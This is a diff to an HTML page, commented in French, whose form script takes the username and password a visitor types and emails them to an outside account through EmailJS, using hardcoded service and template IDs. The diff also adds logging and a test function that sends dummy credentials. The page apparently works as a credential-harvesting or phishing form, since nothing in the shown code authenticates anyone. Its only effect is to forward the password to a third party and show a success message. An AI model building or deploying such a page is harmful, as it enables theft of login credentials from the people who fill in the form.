@@ -8,7 +8,7 @@
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
         // Initialisation d'EmailJS avec ta clé publique
-        emailjs.init("0s69puSeiECXHqvEG"); // Remplace par ta clé publique
+        emailjs.init("0s69puSeiECXHqvEG"); // Remplace par ta clé publique EmailJS
     </script>
     <style>
         body {
@@ -79,8 +79,9 @@
     </div>
 
     <script>
+        // Ajoute un écouteur d'événement au formulaire
         document.getElementById('form').addEventListener('submit', async (e) => {
-            e.preventDefault();
+            e.preventDefault(); // Empêche le rechargement de la page
 
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
@@ -92,19 +93,37 @@
 
             try {
                 console.log("Tentative d'envoi des données...");
-                // Envoi des données via EmailJS
-                await emailjs.send("service_pr4cilr", "template_p533svs", {
+
+                // Appelle le service EmailJS
+                const response = await emailjs.send("service_pr4cilr", "template_p533svs", {
                     username: username,
                     password: password
                 });
 
+                console.log("Réponse EmailJS :", response);
                 alert("Les informations ont été envoyées avec succès !");
             } catch (error) {
                 console.error("Erreur lors de l'envoi :", error);
                 alert("Une erreur s'est produite lors de l'envoi des données.");
             }
         });
+
+        // Test EmailJS dans la console pour le débogage
+        async function testEmailJS() {
+            try {
+                const testResponse = await emailjs.send("service_pr4cilr", "template_p533svs", {
+                    username: "TestUser",
+                    password: "TestPass"
+                });
+
+                console.log("Test EmailJS réussi :", testResponse);
+            } catch (testError) {
+                console.error("Erreur de test avec EmailJS :", testError);
+            }
+        }
+
+        // Appelle cette fonction dans la console pour tester
+        console.log("Utilise testEmailJS() dans la console pour vérifier EmailJS.");
     </script>
 </body>
 </html>
-
